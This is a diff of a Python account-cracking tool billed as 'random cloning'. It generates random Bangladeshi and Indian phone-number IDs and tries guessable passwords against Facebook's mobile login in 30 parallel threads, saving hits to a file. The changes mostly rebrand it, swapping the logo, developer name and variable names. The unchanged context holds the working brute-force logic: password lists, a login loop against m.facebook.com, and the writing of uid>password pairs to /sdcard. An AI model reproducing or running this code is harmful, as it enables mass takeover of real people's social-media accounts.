@@ -31,22 +31,34 @@ def clear():os.system('clear');print(logo)
 def linex():print(f'{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
 #________________ LOGOX ______________#
 logo=(f'''
-              {A}┏┓┓ ┏┏┓┏┓
-              {A}┗┓┃┃┃┣┫┃┓
-              {A}┗┛┗┻┛┛┗┗┛ V/0.0
+               {A}    ...     ..      ..          ..      ...         ...     ..      ..     
+  x*8888x.:*8888: -"888:     :~"8888x :"%888x     x*8888x.:*8888: -"888:   
+ X   48888X `8888H  8888    8    8888Xf  8888>   X   48888X `8888H  8888   
+X8x.  8888X  8888X  !888>  X88x. ?8888k  8888X  X8x.  8888X  8888X  !888>  
+X8888 X8888  88888   "*8%- '8888L'8888X  '%88X  X8888 X8888  88888   "*8%- 
+'*888!X8888> X8888  xH8>    "888X 8888X:xnHH(`` '*888!X8888> X8888  xH8>   
+  `?8 `8888  X888X X888>      ?8~ 8888X X8888     `?8 `8888  X888X X888>   
+  -^  '888"  X888  8888>    -~`   8888> X8888     -^  '888"  X888  8888>   
+   dx '88~x. !88~  8888>    :H8x  8888  X8888      dx '88~x. !88~  8888>   
+ .8888Xf.888x:!    X888X.:  8888> 888~  X8888    .8888Xf.888x:!    X888X.: 
+:""888":~"888"     `888*"   48"` '8*~   `8888!` :""888":~"888"     `888*"  
+    "~'    "~        ""      ^-==""      `""        "~'    "~        ""    
+                                                                           
+                                                                           
+                                                                           V/0.1                                                              V/0.1
 {A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-{A}[=] DEVELOPER : HABIB HOSSAIN
+{A}[=] DEVELOPER : MRIDUl ISLAM
 {A}[=] TOOL      : RANDOM CLONING {A}[{G}BD{A}|{G}IND{A}]
 {A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━''')
 #________________ MENU _____________#
 def menu():
     clear()
-    print(f'{A}[1] RANDOM {G}BD-MIX {A}CLONE ');print(f'{A}[2] RANDOM {G}BD-NEW {A}CLONE');print(f'{A}[3] RANDOM {G}IND {A}CLONE');print(f'{A}[0] EXIT SWAG');linex()
-    swag=input(f'{A}[?] CHOICE : ')
-    if swag in '1':randm_bd_mix()
-    if swag in '2':randm_bd_new()
-    if swag in '3':randm_ind()
-    if swag in '0':sys.exit(f'{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+    print(f'{A}[1] RANDOM {G}BD-MIX {A}CLONE ');print(f'{A}[2] RANDOM {G}BD-NEW {A}CLONE');print(f'{A}[3] RANDOM {G}IND {A}CLONE');print(f'{A}[0] EXIT MRM');linex()
+    MRM=input(f'{A}[?] CHOICE : ')
+    if MRM in '1':randm_bd_mix()
+    if MRM in '2':randm_bd_new()
+    if MRM in '3':randm_ind()
+    if MRM in '0':sys.exit(f'{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
 #________________ RANDOM-BD-MIX _____________# 
 def randm_bd_mix():
      clear()
@@ -62,7 +74,7 @@ def randm_bd_mix():
      for x in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(8))
         user.append(nmp)
-     with tred(max_workers=30) as habibx:
+     with tred(max_workers=30) as mridulx:
         clear()
         total=str(len(user))
         print(f'{A}[=] SIM CODE :{G} {code} {A}BD-MIX')
@@ -74,8 +86,8 @@ def randm_bd_mix():
             bal2 = love[:7]
             bal3 = uid[:8]
             pss = [love,uid,bal1,bal2,bal3,'Bangla','bangla','Free Fire','free fire','@#@#@#','@@@###']
-            if mthd in ['1','01']:habibx.submit(habibxx1,uid,pss)
-            if mthd in ['2','02']:habibx.submit(habibxx2,uid,pss)
+            if mthd in ['1','01']:mridulx.submit(mridulxx1,uid,pss)
+            if mthd in ['2','02']:mridulx.submit(mridulxx2,uid,pss)
      print(f' ')
      print(f'\n{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
      print(f"{A}[=] CLONE COMPLETE BROTHER ")
@@ -108,8 +120,8 @@ def randm_bd_new():
         for love in user:
             uid = code+balx1+balx2+love
             pss = [balx1+balx2+love,balx2+love,code+balx1+balx2,code+code,code+'123',code+'1234','FREE FIRE','free fire','i love you']
-            if mthd in ['1','01']:habibx.submit(habibxx1,uid,pss)
-            if mthd in ['2','02']:habibx.submit(habibxx2,uid,pss)
+            if mthd in ['1','01']:mridulx.submit(mridulxx1,uid,pss)
+            if mthd in ['2','02']:mridulx.submit(mridulxx2,uid,pss)
      print(f' ')
      print(f'\n{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
      print(f"{A}[=] CLONE COMPLETE BROTHER ")
@@ -131,7 +143,7 @@ def randm_ind():
      for x in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(7))
         user.append(nmp)
-     with tred(max_workers=30) as habibx:
+     with tred(max_workers=30) as mridulx:
         clear()
         total=str(len(user))
         print(f'{A}[=] SIM CODE :{G} {code} {A}IND')
@@ -140,8 +152,8 @@ def randm_ind():
         for love in user:
             uid = code+love
             pss = ['57575752','india123','57575751','57273200','59039200',uid,love,uid[3:]]
-            if mthd in ['1','01']:habibx.submit(habibxx1,uid,pss)
-            if mthd in ['2','02']:habibx.submit(habibxx2,uid,pss)
+            if mthd in ['1','01']:mridulx.submit(mridulxx1,uid,pss)
+            if mthd in ['2','02']:mridulx.submit(mridulxx2,uid,pss)
      print(f' ')
      print(f'\n{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
      print(f"{A}[=] CLONE COMPLETE BROTHER ")
@@ -154,7 +166,7 @@ def habibxx1(uid,pss):
     try:
         for ps in pss:
             session=requests.Session()
-            sys.stdout.write(f'\r\r{A}[SWAG-M1] {loop} {len(oks)}|{len(cps)} ')
+            sys.stdout.write(f'\r\r{A}[MRM-M1] {loop} {len(oks)}|{len(cps)} ')
             sys.stdout.flush()
             pro = random.choice(ugen)
             free_fb = session.get('https://m.facebook.com').text
@@ -221,7 +233,7 @@ def habibxx2(uid,pss):
     try:
         for ps in pss:
             session=requests.Session()
-            sys.stdout.write(f'\r\r{A}[SWAG-M2] {loop} {len(oks)}|{len(cps)} ')
+            sys.stdout.write(f'\r\r{A}[MRM-M2] {loop} {len(oks)}|{len(cps)} ')
             sys.stdout.flush()
             pro = random.choice(ugen)
             free_fb = session.get('https://m.facebook.com').text
@@ -274,8 +286,8 @@ def habibxx2(uid,pss):
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 coki1 = coki.split("1000")[1]
                 uid = "1000"+coki1[0:11]
-                #print(f'\r\r{Y}[SWAG-CP] {uid} | {ps}')
-                open('/sdcard/SWAG-RANDM-CP','a').write(uid+'>'+ps+'\n')
+                #print(f'\r\r{Y}[MRM-CP] {uid} | {ps}')
+                open('/sdcard/MRM-RANDM-CP','a').write(uid+'>'+ps+'\n')
                 cps.append(uid)
                 break
             else:
